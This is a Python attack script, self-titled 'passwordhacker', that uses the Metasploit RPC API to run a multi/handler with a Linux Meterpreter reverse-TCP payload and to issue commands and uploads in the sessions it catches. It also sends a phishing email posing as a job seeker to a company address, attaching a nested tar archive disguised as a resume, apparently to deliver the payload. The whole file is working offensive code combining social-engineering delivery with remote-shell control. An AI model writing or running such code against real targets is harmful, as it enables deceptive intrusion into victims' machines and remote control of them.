#!/usr/bin/python3.8
#passwordhacker

# -*- coding: utf-8 -*-
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from platform import python_version
import os  ,time
from pymetasploit3.msfconsole import MsfRpcConsole
from pymetasploit3.msfrpc import MsfRpcClient
#from pymetasploit3.msfrpc import *

# alias rpc1='msfrpcd -P 'Parol1234' -p 55553 -n -f -a 127.0.0.1'
#os.system(f'msfrpcd -P {passwrd} -S  -a 127.0.0.1 ')

client = MsfRpcClient("Parol1234", port=55553, ssl=True)

def run_with_output(module, payload=None):
	print('in run_with_output')
	cid = client.consoles.console().cid
	return client.consoles.console(cid).run_module_with_output(module, payload)

def last_session():
    return list(client.sessions.list)[-1]



#handler = client.modules.use('exploit', 'multi/handler')
#print(handler)
#pl = client.modules.use('payload', 'linux/x64/meterpreter/reverse_tcp')  
#pl['LHOST'] = '10.10.10.20'
#pl['LPORT'] = 443

def handler():
	print('test handler')
	handler = client.modules.use('exploit', 'multi/handler')
	print(handler.runoptions)
	print(handler.missing_required)
	return handler

def payload():
	#set PAYLOAD linux/x64/meterpreter/reverse_tcp
	#linux/x64/shell_reverse_tcp x86 
	print('test payload')
	pl = client.modules.use('payload', 'linux/x64/meterpreter/reverse_tcp')  
	pl['LHOST'] = '10.10.10.10'
	pl['LPORT'] = 443
	#pl['VERBOSE'] = True
	return pl

def revsh():	
	handle = handler()
	pl = payload()
	print(handle.execute(payload=pl))
	old = client.sessions.list
	print('old ',old)
	while True:			
		if client.sessions.list != old:
			#shell = client.sessions.session(last_session())
			shell = client.sessions.session(list(client.sessions.list)[-1])
			shell.write('pwd')
			shell.write('exit') #sessions -k N session
			print(shell.read())
			return shell

def hacker():
	#shell = revsh()
	while True:
		handle = handler()
		pl = payload()
		output= run_with_output(handle, pl)
		print(output)
		time.sleep(3)
		print(client.sessions.list)
		shell = client.sessions.session(last_session())
		shell.write('pwd')
		shell.write('upload -f readme.txt')
		print(shell.read())
		shell.write('exit') #sessions -k N session
		print(shell.read())
		time.sleep(2)
		quit()
		#return shell

#revsh()


                                           
#os.chdir('/home/attacker/Рабочий стол/hacker_papka')
def zippp():
	print('zip')
	#os.system('tar -cf resumepdf1.tar resume_for_hr.pdf')
	#os.system('tar -cf resumepdf2.tar resumepdf1.tar')
	#os.system('tar -cf resumepdf3.tar resumepdf2.tar')
	
	
	#os.remove(old!!!!!!!!!!!!!!!!!!!!!!!!!)

def send_mail():
	server = 'smtp.mail.ru'
	user = 'тут почта'
	password = 'тут пароль от почты для веб-приложения'
	 
	recipients = ['best_company_201@mail.ru']
	sender = 'max_smith_find_job@mail.ru'
	subject = 'new resume'
	text = 'Здравствуйте еще раз! я заинтересован в вашей работе. Вот мое резюме'
	html = '<html><head></head><body><p>'+text+'</p></body></html>'
	 
	filepath = "/home/attacker/Рабочий стол/downloaded/resumepdf3.tar"
	basename = os.path.basename(filepath)
	filesize = os.path.getsize(filepath)
	 
	msg = MIMEMultipart('alternative')
	msg['Subject'] = subject
	msg['From'] = 'Max it-specialist <' + sender + '>'
	msg['To'] = ', '.join(recipients)
	msg['Reply-To'] = sender
	msg['Return-Path'] = sender
	msg['X-Mailer'] = 'Python/'+(python_version())
	 
	part_text = MIMEText(text, 'plain')
	part_html = MIMEText(html, 'html')
	part_file = MIMEBase('application', 'octet-stream; name="{}"'.format(basename))
	part_file.set_payload(open(filepath,"rb").read() )
	part_file.add_header('Content-Description', basename)
	part_file.add_header('Content-Disposition', 'attachment; filename="{}"; size={}'.format(basename, filesize))
	encoders.encode_base64(part_file)
	 
	msg.attach(part_text)
	msg.attach(part_html)
	msg.attach(part_file)
	 
	mail = smtplib.SMTP_SSL(server)
	mail.login(user, password)
	mail.sendmail(sender, recipients, msg.as_string())
	mail.quit()

	
send_mail()	
hacker()

	
